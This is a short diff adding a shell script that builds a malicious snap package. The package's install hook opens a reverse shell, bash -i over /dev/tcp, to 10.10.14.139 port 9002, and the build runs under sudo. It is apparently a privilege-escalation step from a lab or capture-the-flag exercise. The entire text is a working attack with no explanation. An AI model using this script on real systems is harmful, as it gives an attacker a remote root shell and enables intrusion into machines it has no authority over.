@@ -1,0 +1,6 @@
+COMMAND="bash -c 'bash -i >& /dev/tcp/10.10.14.139/9002 0>&1'"
+cd $(mktemp -d)
+mkdir -p meta/hooks
+printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
+chmod +x meta/hooks/install
+sudo fpm -n xxxx -s dir -t snap -a all meta
